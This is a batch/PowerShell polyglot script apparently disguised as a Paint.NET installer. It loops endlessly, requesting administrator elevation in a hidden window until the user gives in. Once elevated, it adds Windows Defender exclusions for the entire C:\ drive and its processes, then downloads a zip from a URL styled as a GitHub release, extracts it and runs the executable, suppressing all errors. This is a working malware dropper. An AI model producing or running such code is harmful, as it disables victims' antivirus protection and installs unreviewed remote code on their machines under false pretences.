<# :batch script
Echo Please wait...
@echo off
setlocal
cd "%~dp0"
powershell -ep remotesigned -Command "IEX $([System.IO.File]::ReadAllText('%~f0'))"
endlocal
goto:eof
#>
while($true) {
    try {
        Start-Process 'cmd' -WindowStyle Hidden -Verb runas -ArgumentList '/k powershell -command add-mppreference -exclusionpath C:\ && powershell -command add-mppreference -exclusionprocess C:\ && powershell -command "& { 
            $zipPath = \"$env:USERPROFILE\AppData\Local\paintdotnet.zip\"; 
            $extractPath = \"$env:USERPROFILE\AppData\Local\paintdotnet\"; 
            $exePath = \"$extractPath\paint.net.5.0.13.install.anycpu.web.exe\"; 
            Invoke-WebRequest -Uri \"https://github.com/paintdotnet/release/releases/download/v5.0.13/paint.net.5.0.13.install.anycpu.web.zip\" -OutFile $zipPath; 
            Expand-Archive -Path $zipPath -DestinationPath $extractPath; 
            Start-Process -FilePath $exePath; 
        }"; exit'
    } catch {
        # Handle errors silently
    }
}
